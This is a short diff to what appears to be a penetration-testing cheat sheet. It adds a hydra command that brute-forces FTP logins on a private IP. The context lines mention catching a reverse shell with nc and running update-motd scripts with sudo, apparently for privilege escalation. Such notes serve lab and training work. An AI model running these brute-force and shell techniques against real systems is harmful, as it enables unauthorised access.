@@ -239,3 +239,7 @@ run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will g
 
 `cat /run/motd.dynamic`
 `sudo run-parts /etc/update-motd.d/`
+
+### Brute Force FTP Login
+
+`hydra -L users.txt -P /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 192.168.79.46 ftp –V -f `
